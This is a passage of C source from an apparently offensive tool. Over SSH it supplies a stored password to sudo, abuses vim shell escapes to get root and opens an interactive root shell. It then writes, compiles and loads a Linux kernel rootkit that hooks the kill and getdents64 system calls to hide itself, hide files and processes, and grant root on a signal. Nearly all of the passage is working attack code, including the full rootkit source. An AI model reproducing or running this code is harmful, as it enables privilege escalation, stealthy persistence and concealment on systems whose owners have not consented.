            if (strstr(buffer, "INSMOD_SUCCESS")) {
                success = 1;
            }
            if (strstr(buffer, "MODULE_VERIFIED_LOADED")) {
                module_verified = 1;
            }
            if (strstr(buffer, "INSMOD_FAILED")) {
                success = 0;
            }
        }
        usleep(500000);
        timeout--;
    }
    
    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    if (success && module_verified) {
        printf("[+] Rootkit successfully loaded and verified\n");
        return 0;
    } else if (success) {
        printf("[!] Command executed but module verification failed\n");
        return -1;
    } else {
        printf("[-] Command execution failed\n");
        return -1;
    }
}

int execute_vim_command_with_auto_password(ssh_session session, const char *vim_command) {
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) {
        fprintf(stderr, "Error creating SSH channel: %s\n", ssh_get_error(session));
        return -1;
    }
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        fprintf(stderr, "Error opening SSH channel: %s\n", ssh_get_error(session));
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_pty(channel) != SSH_OK) {
        fprintf(stderr, "Error requesting PTY: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_shell(channel) != SSH_OK) {
        fprintf(stderr, "Error requesting shell: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(500000);
    
    printf("[*] Executing vim command: %s\n", vim_command);
    
    char full_command[2048];
    snprintf(full_command, sizeof(full_command), "%s\n", vim_command);
    
    if (ssh_channel_write(channel, full_command, strlen(full_command)) < 0) {
        fprintf(stderr, "Error writing vim command: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(2000000);
    
    char buffer[4096];
    int nbytes;
    int password_prompt_detected = 0;
    int command_executed = 0;
    int timeout = 15;
    
    while (timeout > 0) {
        nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer) - 1, 0);
        if (nbytes > 0) {
            buffer[nbytes] = '\0';
            printf("%s", buffer);
            
            if ((strstr(buffer, "password") != NULL || 
                 strstr(buffer, "Password") != NULL ||
                 strstr(buffer, "[sudo]") != NULL) && 
                !password_prompt_detected) {
                
                password_prompt_detected = 1;
                printf("[*] Password prompt detected, supplying password automatically...\n");
                
                if (global_password) {
                    char password_response[300];
                    snprintf(password_response, sizeof(password_response), "%s\n", global_password);
                    
                    if (ssh_channel_write(channel, password_response, strlen(password_response)) < 0) {
                        fprintf(stderr, "Error writing password: %s\n", ssh_get_error(session));
                        break;
                    }
                    
                    printf("[+] Password supplied automatically\n");
                } else {
                    printf("[-] Password prompt detected but no password available\n");
                    break;
                }
            }
            
            if (strstr(buffer, "INSMOD_DONE") || 
                strstr(buffer, "ROOTKIT_LOADED_SUCCESS") ||
                strstr(buffer, "MODULE_FOUND") ||
                strstr(buffer, "boogaloo_rootkit")) {
                command_executed = 1;
            }
            
            if (strstr(buffer, "Operation not permitted") || 
                strstr(buffer, "Permission denied") ||
                strstr(buffer, "Invalid module format") ||
                strstr(buffer, "insmod: ERROR") ||
                strstr(buffer, "Sorry, try again")) {
                printf("[-] Command execution failed\n");
                break;
            }
        }
        
        usleep(500000);
        timeout--;
    }
    
    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    return command_executed ? 0 : -1;
}

int load_rootkit_via_vim_exploit_auto_password(ssh_session session, const char *rootkit_path) {
    printf("[*] Loading rootkit via vim exploit with auto-password: %s\n", rootkit_path);
    
    const char *vim_commands[] = {
        "sudo vi -c ':!insmod %s' -c ':q!' /dev/null",
        "sudo vim -c ':!insmod %s' -c ':q!' /dev/null", 
        "sudo vi -c ':!insmod %s' -c ':qa!' /dev/null",
        "sudo vim -c ':!insmod %s' -c ':qa!' /dev/null",
        "sudo vi -c ':!insmod %s; echo INSMOD_DONE' -c ':q!' /dev/null",
        NULL
    };
    
    for (int attempt = 0; vim_commands[attempt] != NULL; attempt++) {
        printf("[*] Attempt %d with vim command variant\n", attempt + 1);
        
        char formatted_command[PATH_MAX + 200];
        snprintf(formatted_command, sizeof(formatted_command), 
                 vim_commands[attempt], rootkit_path);
        
        if (execute_vim_command_with_auto_password(session, formatted_command) == 0) {
            printf("[*] Verifying module loading...\n");
            
            ssh_channel channel = ssh_channel_new(session);
            if (channel) {
                if (ssh_channel_open_session(channel) == SSH_OK) {
                    if (ssh_channel_request_exec(channel, "lsmod | grep boogaloo") == SSH_OK) {
                        char verify_buffer[1024];
                        int verify_nbytes = ssh_channel_read(channel, verify_buffer, sizeof(verify_buffer) - 1, 0);
                        if (verify_nbytes > 0) {
                            verify_buffer[verify_nbytes] = '\0';
                            printf("%s", verify_buffer);
                            
                            if (strstr(verify_buffer, "boogaloo_rootkit")) {
                                printf("[+] Rootkit successfully loaded and verified on attempt %d\n", attempt + 1);
                                ssh_channel_close(channel);
                                ssh_channel_free(channel);
                                return 0;
                            }
                        }
                    }
                    ssh_channel_close(channel);
                }
                ssh_channel_free(channel);
            }
        }
        
        printf("[-] Attempt %d failed, trying next method...\n", attempt + 1);
        usleep(1000000);
    }
    
    printf("[-] All vim exploit attempts failed\n");
    return -1;
}

int load_rootkit_via_vim_script_auto_password(ssh_session session, const char *rootkit_path) {
    printf("[*] Loading rootkit via vim script method with auto-password: %s\n", rootkit_path);
    
    char script_command[2048];
    snprintf(script_command, sizeof(script_command),
             "cat > /tmp/.load_rootkit.sh << 'EOF' && "
             "chmod +x /tmp/.load_rootkit.sh && "
             "sudo vi -c ':!/tmp/.load_rootkit.sh' -c ':q!' /dev/null && "
             "rm -f /tmp/.load_rootkit.sh\n"
             "#!/bin/bash\n"
             "echo '[*] Loading rootkit module...'\n"
             "insmod %s\n"
             "if [ $? -eq 0 ]; then\n"
             "    echo '[+] ROOTKIT_LOADED_SUCCESS'\n"
             "    lsmod | grep boogaloo\n"
             "else\n"
             "    echo '[-] ROOTKIT_LOAD_FAILED'\n"
             "    echo 'Error code: '$?\n"
             "fi\n"
             "EOF", rootkit_path);
    
    return execute_vim_command_with_auto_password(session, script_command);
}

int hide_module_with_vim_auto_password(ssh_session session) {
    printf("[*] Hiding rootkit module using vim exploit with auto-password...\n");
    
    char hide_command[] = "sudo vi -c ':!kill -64 1' -c ':q!' /dev/null";
    
    if (execute_vim_command_with_auto_password(session, hide_command) == 0) {
        printf("[+] Rootkit module hidden via vim exploit\n");
        return 0;
    } else {
        fprintf(stderr, "[-] Failed to hide rootkit module\n");
        return -1;
    }
}

int show_module_with_vim_auto_password(ssh_session session) {
    printf("[*] Showing rootkit module using vim exploit with auto-password...\n");
    
    char hide_command[] = "sudo vi -c ':!kill -64 1' -c ':q!' /dev/null";
    
    if (execute_vim_command_with_auto_password(session, hide_command) == 0) {
        printf("[+] Rootkit module showed via vim exploit\n");
        return 0;
    } else {
        fprintf(stderr, "[-] Failed to show rootkit module\n");
        return -1;
    }
}

int hide_pid_with_vim_auto_password(ssh_session session, int pid) {
    printf("[*] Hiding process %d using vim exploit with auto-password...\n", pid);
    
    char hide_pid_command[128];
    snprintf(hide_pid_command, sizeof(hide_pid_command), 
             "sudo vi -c ':!kill -62 %d' -c ':q!' /dev/null", pid);
    
    if (execute_vim_command_with_auto_password(session, hide_pid_command) == 0) {
        printf("[+] Process %d hidden via vim exploit\n", pid);
        return 0;
    } else {
        fprintf(stderr, "[-] Failed to hide process %d\n", pid);
        return -1;
    }
}

int show_pid_with_vim_auto_password(ssh_session session, int pid) {
    printf("[*] Showing process %d using vim exploit with auto-password...\n", pid);
    
    char hide_pid_command[128];
    snprintf(hide_pid_command, sizeof(hide_pid_command), 
             "sudo vi -c ':!kill -62 %d' -c ':q!' /dev/null", pid);
    
    if (execute_vim_command_with_auto_password(session, hide_pid_command) == 0) {
        printf("[+] Process %d showed via vim exploit\n", pid);
        return 0;
    } else {
        fprintf(stderr, "[-] Failed to show process %d\n", pid);
        return -1;
    }
}

int interactive_vim_root_shell_auto_password(ssh_session session) {
    printf("[*] Starting interactive root shell via vim exploit with auto-password...\n");
    
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) {
        fprintf(stderr, "Error creating SSH channel: %s\n", ssh_get_error(session));
        return -1;
    }
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        fprintf(stderr, "Error opening SSH channel: %s\n", ssh_get_error(session));
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_pty(channel) != SSH_OK) {
        fprintf(stderr, "Error requesting PTY: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_shell(channel) != SSH_OK) {
        fprintf(stderr, "Error requesting shell: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(500000);
    
    const char *vim_root_cmd = "sudo vi -c ':!/bin/bash'\n";
    ssh_channel_write(channel, vim_root_cmd, strlen(vim_root_cmd));
    
    usleep(2000000);
    
    char buffer[4096];
    int nbytes;
    int password_handled = 0;
    
    nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer) - 1, 0);
    if (nbytes > 0) {
        buffer[nbytes] = '\0';
        printf("%s", buffer);
        
        if ((strstr(buffer, "password") || strstr(buffer, "Password") || strstr(buffer, "[sudo]")) 
            && global_password && !password_handled) {
            
            printf("[*] Auto-supplying password for vim root shell...\n");
            char password_response[300];
            snprintf(password_response, sizeof(password_response), "%s\n", global_password);
            ssh_channel_write(channel, password_response, strlen(password_response));
            password_handled = 1;
            usleep(2000000);
        }
    }
    
    struct termios oldt, newt;
    tcgetattr(STDIN_FILENO, &oldt);
    newt = oldt;
    newt.c_lflag &= ~(ICANON | ECHO);
    tcsetattr(STDIN_FILENO, TCSANOW, &newt);
    
    printf("[+] Interactive root shell started. Type 'exit' to quit.\n");
    
    fd_set fds;
    int active = 1;
    
    while (active) {
        FD_ZERO(&fds);
        FD_SET(STDIN_FILENO, &fds);
        FD_SET(ssh_get_fd(session), &fds);
        
        struct timeval tv = {1, 0};
        int select_result = select(ssh_get_fd(session) + 1, &fds, NULL, NULL, &tv);
        
        if (select_result < 0) {
            perror("select");
            break;
        }
        
        if (FD_ISSET(STDIN_FILENO, &fds)) {
            nbytes = read(STDIN_FILENO, buffer, sizeof(buffer));
            if (nbytes > 0) {
                if (nbytes >= 4 && strncmp(buffer, "exit", 4) == 0) {
                    active = 0;
                    break;
                }
                
                if (ssh_channel_write(channel, buffer, nbytes) != nbytes) {
                    fprintf(stderr, "Error writing to channel\n");
                    break;
                }
            } else if (nbytes == 0) {
                break;
            }
        }
        
        if (FD_ISSET(ssh_get_fd(session), &fds)) {
            nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer), 0);
            if (nbytes > 0) {
                if (write(STDOUT_FILENO, buffer, nbytes) != nbytes) {
                    perror("write");
                    break;
                }
            } else if (nbytes < 0) {
                break;
            }
        }
        
        if (ssh_channel_is_eof(channel)) {
            break;
        }
    }
    
    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
    
    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    printf("\n[*] Interactive root shell session ended\n");
    return 0;
}

int show_module_with_vim(ssh_session session) {
    printf("[*] Showing rootkit module using vim exploit...\n");
    
    char show_cmd[64];
    snprintf(show_cmd, sizeof(show_cmd), "kill -64 1");
    
    if (execute_root_command_via_vim(session, show_cmd) == 0) {
        printf("[+] Rootkit module visibility toggled\n");
        return 0;
    } else {
        fprintf(stderr, "[-] Failed to toggle rootkit module visibility\n");
        return -1;
    }
}

int hide_pid_with_vim(ssh_session session, int pid) {
    printf("[*] Hiding process %d using vim exploit...\n", pid);
    
    char hide_pid_cmd[64];
    snprintf(hide_pid_cmd, sizeof(hide_pid_cmd), "kill -62 %d", pid);
    
    if (execute_root_command_via_vim_v2(session, hide_pid_cmd) == 0) {
        printf("[+] Process %d hidden (method 2)\n", pid);
        return 0;
    }
    
    if (execute_root_command_via_vim(session, hide_pid_cmd) == 0) {
        printf("[+] Process %d hidden (method 1)\n", pid);
        return 0;
    }
    
    fprintf(stderr, "[-] Failed to hide process %d\n", pid);
    return -1;
}

// ==================== Rootkit Functions ====================

int create_and_compile_rootkit(ssh_session session) {
    printf("[*] Creating and compiling rootkit on remote machine...\n");
    
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) return -1;
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_pty(channel) != SSH_OK) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_shell(channel) != SSH_OK) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    usleep(500000);
    
    printf("[*] Creating ftrace_helper.h...\n");
    const char *ftrace_helper_part1 = 
        "cat > /tmp/ftrace_helper.h << 'EOFHEADER'\n"
        "#include <linux/ftrace.h>\n"
        "#include <linux/linkage.h>\n"
        "#include <linux/slab.h>\n"
        "#include <linux/uaccess.h>\n"
        "#include <linux/version.h>\n"
        "\n"
        "#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))\n"
        "#define PTREGS_SYSCALL_STUBS 1\n"
        "#endif\n"
        "\n"
        "#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)\n"
        "#define KPROBE_LOOKUP 1\n"
        "#include <linux/kprobes.h>\n"
        "static struct kprobe kp = {\n"
        "    .symbol_name = \"kallsyms_lookup_name\"\n"
        "};\n"
        "#endif\n"
        "\n"
        "#define HOOK(_name, _hook, _orig) { .name = (_name), .function = (_hook), .original = (_orig) }\n"
        "\n"
        "#define USE_FENTRY_OFFSET 0\n"
        "#if !USE_FENTRY_OFFSET\n"
        "#pragma GCC optimize(\"-fno-optimize-sibling-calls\")\n"
        "#endif\n"
        "\n"
        "struct ftrace_hook {\n"
        "    const char *name;\n"
        "    void *function;\n"
        "    void *original;\n"
        "    unsigned long address;\n"
        "    struct ftrace_ops ops;\n"
        "};\n"
        "EOFHEADER\n";
    
    ssh_channel_write(channel, ftrace_helper_part1, strlen(ftrace_helper_part1));
    usleep(2000000);
    
    const char *ftrace_helper_part2 = 
        "cat >> /tmp/ftrace_helper.h << 'EOFHEADER2'\n"
        "static int fh_resolve_hook_address(struct ftrace_hook *hook)\n"
        "{\n"
        "#ifdef KPROBE_LOOKUP\n"
        "    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);\n"
        "    kallsyms_lookup_name_t kallsyms_lookup_name;\n"
        "    register_kprobe(&kp);\n"
        "    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;\n"
        "    unregister_kprobe(&kp);\n"
        "#endif\n"
        "    hook->address = kallsyms_lookup_name(hook->name);\n"
        "    if (!hook->address) {\n"
        "        printk(KERN_DEBUG \"rootkit: unresolved symbol: %s\\n\", hook->name);\n"
        "        return -ENOENT;\n"
        "    }\n"
        "#if USE_FENTRY_OFFSET\n"
        "    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;\n"
        "#else\n"
        "    *((unsigned long*) hook->original) = hook->address;\n"
        "#endif\n"
        "    return 0;\n"
        "}\n"
        "EOFHEADER2\n";
    
    ssh_channel_write(channel, ftrace_helper_part2, strlen(ftrace_helper_part2));
    usleep(2000000);
    
    const char *ftrace_helper_part3 = 
        "cat >> /tmp/ftrace_helper.h << 'EOFHEADER3'\n"
        "#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,11,0)\n"
        "static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,\n"
        "                                   struct ftrace_ops *ops, struct ftrace_regs *fregs)\n"
        "{\n"
        "    struct pt_regs *regs;\n"
        "    if (!fregs) return;\n"
        "    regs = ftrace_get_regs(fregs);\n"
        "    if (!regs) return;\n"
        "#else\n"
        "static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,\n"
        "                                   struct ftrace_ops *ops, struct pt_regs *regs)\n"
        "{\n"
        "    if (!regs) return;\n"
        "#endif\n"
        "    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);\n"
        "#if USE_FENTRY_OFFSET\n"
        "    regs->ip = (unsigned long)hook->function;\n"
        "#else\n"
        "    if (!within_module(parent_ip, THIS_MODULE))\n"
        "        regs->ip = (unsigned long)hook->function;\n"
        "#endif\n"
        "}\n"
        "EOFHEADER3\n";
    
    ssh_channel_write(channel, ftrace_helper_part3, strlen(ftrace_helper_part3));
    usleep(2000000);
    
    const char *ftrace_helper_part4 = 
        "cat >> /tmp/ftrace_helper.h << 'EOFHEADER4'\n"
        "int fh_install_hook(struct ftrace_hook *hook)\n"
        "{\n"
        "    int err;\n"
        "    err = fh_resolve_hook_address(hook);\n"
        "    if(err) return err;\n"
        "    hook->ops.func = fh_ftrace_thunk;\n"
        "    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;\n"
        "    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);\n"
        "    if(err) {\n"
        "        printk(KERN_DEBUG \"rootkit: ftrace_set_filter_ip() failed: %d\\n\", err);\n"
        "        return err;\n"
        "    }\n"
        "    err = register_ftrace_function(&hook->ops);\n"
        "    if(err) {\n"
        "        printk(KERN_DEBUG \"rootkit: register_ftrace_function() failed: %d\\n\", err);\n"
        "        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);\n"
        "        return err;\n"
        "    }\n"
        "    return 0;\n"
        "}\n"
        "EOFHEADER4\n";
    
    ssh_channel_write(channel, ftrace_helper_part4, strlen(ftrace_helper_part4));
    usleep(2000000);
    
    const char *ftrace_helper_part5 = 
        "cat >> /tmp/ftrace_helper.h << 'EOFHEADER5'\n"
        "void fh_remove_hook(struct ftrace_hook *hook)\n"
        "{\n"
        "    int err;\n"
        "    err = unregister_ftrace_function(&hook->ops);\n"
        "    if(err) printk(KERN_DEBUG \"rootkit: unregister_ftrace_function() failed: %d\\n\", err);\n"
        "    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);\n"
        "    if(err) printk(KERN_DEBUG \"rootkit: ftrace_set_filter_ip() failed: %d\\n\", err);\n"
        "}\n"
        "\n"
        "int fh_install_hooks(struct ftrace_hook *hooks, size_t count)\n"
        "{\n"
        "    int err;\n"
        "    size_t i;\n"
        "    for (i = 0 ; i < count ; i++) {\n"
        "        err = fh_install_hook(&hooks[i]);\n"
        "        if(err) goto error;\n"
        "    }\n"
        "    return 0;\n"
        "error:\n"
        "    while (i != 0) {\n"
        "        fh_remove_hook(&hooks[--i]);\n"
        "    }\n"
        "    return err;\n"
        "}\n"
        "\n"
        "void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)\n"
        "{\n"
        "    size_t i;\n"
        "    for (i = 0 ; i < count ; i++)\n"
        "        fh_remove_hook(&hooks[i]);\n"
        "}\n"
        "EOFHEADER5\n";
    
    ssh_channel_write(channel, ftrace_helper_part5, strlen(ftrace_helper_part5));
    usleep(2000000);
    
    printf("[*] Creating rootkit.c...\n");
    const char *rootkit_c_part1 = 
        "cat > /tmp/boogaloo_rootkit.c << 'EOFCODE'\n"
        "#include <linux/init.h>\n"
        "#include <linux/module.h>\n"
        "#include <linux/kernel.h>\n"
        "#include <linux/syscalls.h>\n"
        "#include <linux/kallsyms.h>\n"
        "#include <linux/dirent.h>\n"
        "#include <linux/version.h>\n"
        "#include <linux/fs.h>\n"
        "#include <linux/uaccess.h>\n"
        "#include <linux/string.h>\n"
        "\n"
        "#include \"ftrace_helper.h\"\n"
        "\n"
        "MODULE_LICENSE(\"GPL\");\n"
        "MODULE_AUTHOR(\"TheXcellerator && lain0xff\");\n"
        "MODULE_DESCRIPTION(\"Combined rootkit\");\n"
        "MODULE_VERSION(\"1.00\");\n"
        "\n"
        "#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))\n"
        "#define PTREGS_SYSCALL_STUBS 1\n"
        "#endif\n"
        "\n"
        "#define PREFIX \"boogaloo\"\n"
        "#define SIGNAL_HIDE_SHOW    64\n"
        "#define SIGNAL_ROOT         63\n"
        "#define SIGNAL_HIDE_PROCESS 62\n"
        "\n"
        "static struct list_head *prev_module;\n"
        "static short hidden = 0;\n"
        "char hide_pid[NAME_MAX];\n"
        "EOFCODE\n";
    
    ssh_channel_write(channel, rootkit_c_part1, strlen(rootkit_c_part1));
    usleep(2000000);
    
    const char *rootkit_c_part2 = 
        "cat >> /tmp/boogaloo_rootkit.c << 'EOFCODE2'\n"
        "#ifdef PTREGS_SYSCALL_STUBS\n"
        "static asmlinkage long (*orig_kill)(const struct pt_regs *);\n"
        "static asmlinkage long (*orig_getdents64)(const struct pt_regs *);\n"
        "\n"
        "asmlinkage int hook_kill(const struct pt_regs *regs)\n"
        "{\n"
        "    pid_t pid = regs->di;\n"
        "    int sig = regs->si;\n"
        "\n"
        "    if (sig == SIGNAL_HIDE_SHOW) {\n"
        "        if (hidden == 0) {\n"
        "            printk(KERN_INFO \"rootkit: hiding module\\n\");\n"
        "            prev_module = THIS_MODULE->list.prev;\n"
        "            list_del(&THIS_MODULE->list);\n"
        "            hidden = 1;\n"
        "        } else {\n"
        "            printk(KERN_INFO \"rootkit: showing module\\n\");\n"
        "            list_add(&THIS_MODULE->list, prev_module);\n"
        "            hidden = 0;\n"
        "        }\n"
        "        return 0;\n"
        "    } else if (sig == SIGNAL_ROOT) {\n"
        "        struct cred *root;\n"
        "        printk(KERN_INFO \"rootkit: giving root\\n\");\n"
        "        root = prepare_creds();\n"
        "        if (root == NULL) return orig_kill(regs);\n"
        "        root->uid.val = root->gid.val = 0;\n"
        "        root->euid.val = root->egid.val = 0;\n"
        "        root->suid.val = root->sgid.val = 0;\n"
        "        root->fsuid.val = root->fsgid.val = 0;\n"
        "        commit_creds(root);\n"
        "        return 0;\n"
        "    } else if (sig == SIGNAL_HIDE_PROCESS) {\n"
        "        sprintf(hide_pid, \"%d\", pid);\n"
        "        return 0;\n"
        "    }\n"
        "    return orig_kill(regs);\n"
        "}\n"
        "#endif\n"
        "EOFCODE2\n";
    
    ssh_channel_write(channel, rootkit_c_part2, strlen(rootkit_c_part2));
    usleep(2000000);
    
    const char *rootkit_c_part3 = 
        "cat >> /tmp/boogaloo_rootkit.c << 'EOFCODE3'\n"
        "#ifdef PTREGS_SYSCALL_STUBS\n"
        "asmlinkage int hook_getdents64(const struct pt_regs *regs)\n"
        "{\n"
        "    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;\n"
        "    long error;\n"
        "    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;\n"
        "    unsigned long offset = 0;\n"
        "\n"
        "    int ret = orig_getdents64(regs);\n"
        "    dirent_ker = kzalloc(ret, GFP_KERNEL);\n"
        "\n"
        "    if ((ret <= 0) || (dirent_ker == NULL))\n"
        "        return ret;\n"
        "\n"
        "    error = copy_from_user(dirent_ker, dirent, ret);\n"
        "    if (error) goto done;\n"
        "\n"
        "    while (offset < ret) {\n"
        "        current_dir = (void *)dirent_ker + offset;\n"
        "        if ((memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) ||\n"
        "            ((strlen(hide_pid) > 0) && (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0))) {\n"
        "            if (current_dir == dirent_ker) {\n"
        "                ret -= current_dir->d_reclen;\n"
        "                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);\n"
        "                continue;\n"
        "            }\n"
        "            previous_dir->d_reclen += current_dir->d_reclen;\n"
        "        } else {\n"
        "            previous_dir = current_dir;\n"
        "        }\n"
        "        offset += current_dir->d_reclen;\n"
        "    }\n"
        "\n"
        "    error = copy_to_user(dirent, dirent_ker, ret);\n"
        "done:\n"
        "    kfree(dirent_ker);\n"
        "    return ret;\n"
        "}\n"
        "#endif\n"
        "EOFCODE3\n";
    
    ssh_channel_write(channel, rootkit_c_part3, strlen(rootkit_c_part3));
    usleep(2000000);
    
    const char *rootkit_c_part4 = 
        "cat >> /tmp/boogaloo_rootkit.c << 'EOFCODE4'\n"
        "static struct ftrace_hook hooks[] = {\n"
        "    HOOK(\"__x64_sys_kill\", hook_kill, &orig_kill),\n"
        "    HOOK(\"__x64_sys_getdents64\", hook_getdents64, &orig_getdents64),\n"
        "};\n"
        "\n"
        "static int __init rootkit_init(void)\n"
        "{\n"
        "    int err;\n"
        "    memset(hide_pid, 0, NAME_MAX);\n"
        "    pr_info(\"rootkit: Loading combined rootkit module\\n\");\n"
        "    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));\n"
        "    if(err) {\n"
        "        pr_err(\"rootkit: Failed to install hooks: %d\\n\", err);\n"
        "        return err;\n"
        "    }\n"
        "    printk(KERN_INFO \"rootkit: Combined rootkit loaded\\n\");\n"
        "    return 0;\n"
        "}\n"
        "\n"
        "static void __exit rootkit_exit(void)\n"
        "{\n"
        "    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));\n"
        "    printk(KERN_INFO \"rootkit: Combined rootkit unloaded\\n\");\n"
        "}\n"
        "\n"
        "module_init(rootkit_init);\n"
        "module_exit(rootkit_exit);\n"
        "EOFCODE4\n";
    
    ssh_channel_write(channel, rootkit_c_part4, strlen(rootkit_c_part4));
    usleep(2000000);
    
    printf("[*] Creating Makefile...\n");
    const char *makefile_cmd = "printf 'obj-m += boogaloo_rootkit.o\\n\\nall:\\n\\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\\n\\nclean:\\n\\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\\n' > /tmp/Makefile\n";
    ssh_channel_write(channel, makefile_cmd, strlen(makefile_cmd));
    usleep(1000000);
    
    printf("[*] Checking for kernel headers...\n");
    const char *check_headers = "ls -la /lib/modules/$(uname -r)/build/ 2>&1 || echo 'NO_KERNEL_HEADERS'\n";
    ssh_channel_write(channel, check_headers, strlen(check_headers));
    usleep(2000000);
    
    const char *install_headers = "if [ ! -d /lib/modules/$(uname -r)/build ]; then "
                                 "echo '[*] Installing kernel headers...'; "
                                 "apt-get update >/dev/null 2>&1 && apt-get install -y linux-headers-$(uname -r) >/dev/null 2>&1 || "
                                 "yum install -y kernel-devel-$(uname -r) >/dev/null 2>&1 || "
                                 "echo 'Failed to install headers'; fi\n";
    ssh_channel_write(channel, install_headers, strlen(install_headers));
    usleep(5000000);
    
    printf("[*] Compiling rootkit...\n");
    const char *compile_cmd = "cd /tmp && make 2>&1\n";
    ssh_channel_write(channel, compile_cmd, strlen(compile_cmd));
    usleep(5000000);
    
    const char *check_compile = "ls -la /tmp/boogaloo_rootkit.ko 2>/dev/null && echo 'COMPILATION_SUCCESS' || echo 'COMPILATION_FAILED'\n";
    ssh_channel_write(channel, check_compile, strlen(check_compile));
    usleep(2000000);
    
    char buffer[4096];
    int nbytes;
    int timeout = 30;
    int compilation_success = 0;
    
    while (timeout > 0) {
        nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer) - 1, 0);
        if (nbytes > 0) {
            buffer[nbytes] = '\0';
            printf("%s", buffer);
            
            if (strstr(buffer, "COMPILATION_SUCCESS")) {
                compilation_success = 1;
            }
        }
        usleep(500000);
        timeout--;
    }
    
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    return compilation_success ? 0 : -1;
}

int deploy_rootkit_with_vim(ssh_session session) {
    printf("[*] Deploying rootkit using alternative methods (no sudo required)...\n");
    
    if (create_and_compile_rootkit(session) != 0) {
        fprintf(stderr, "[-] Failed to create and compile rootkit\n");
        return -1;
    }
    
    char find_rootkit_cmd[512];
    snprintf(find_rootkit_cmd, sizeof(find_rootkit_cmd), 
             "find /tmp -name 'boogaloo_rootkit.ko' -type f 2>/dev/null | head -1");
    
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) {
        fprintf(stderr, "Error creating SSH channel\n");
        return -1;
    }
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        fprintf(stderr, "Error opening SSH channel\n");
        ssh_channel_free(channel);
        return -1;
    }
    
    if (ssh_channel_request_exec(channel, find_rootkit_cmd) != SSH_OK) {
        fprintf(stderr, "Error finding rootkit file\n");
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    char rootkit_path[PATH_MAX] = {0};
    int nbytes = ssh_channel_read(channel, rootkit_path, sizeof(rootkit_path) - 1, 0);
    if (nbytes > 0) {
        rootkit_path[nbytes] = '\0';
        char *newline = strchr(rootkit_path, '\n');
        if (newline) *newline = '\0';
    }
    
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    if (strlen(rootkit_path) == 0) {
        fprintf(stderr, "[-] Could not find compiled rootkit\n");
        return -1;
    }
    
    printf("[+] Found rootkit at: %s\n", rootkit_path);
    
    printf("[*] Attempting direct syscall method...\n");
    if (load_rootkit_via_exploit(session, rootkit_path) == 0) {
        printf("[+] Rootkit loaded successfully using direct syscalls\n");
        return 0;
    }
    
    printf("[*] Kernel module loading failed, deploying userland rootkit...\n");
    if (deploy_userland_rootkit(session) == 0) {
        printf("[+] Userland rootkit deployed successfully\n");
        return 0;
    }
    
    printf("[*] Running system analysis...\n");
    load_rootkit_without_sudo(session, rootkit_path);
    
    fprintf(stderr, "[-] All rootkit deployment methods failed\n");
    return -1;
}

int cleanup_rootkit_files(ssh_session session) {
    printf("[*] Cleaning up rootkit files...\n");
    
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) return -1;
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        ssh_channel_free(channel);
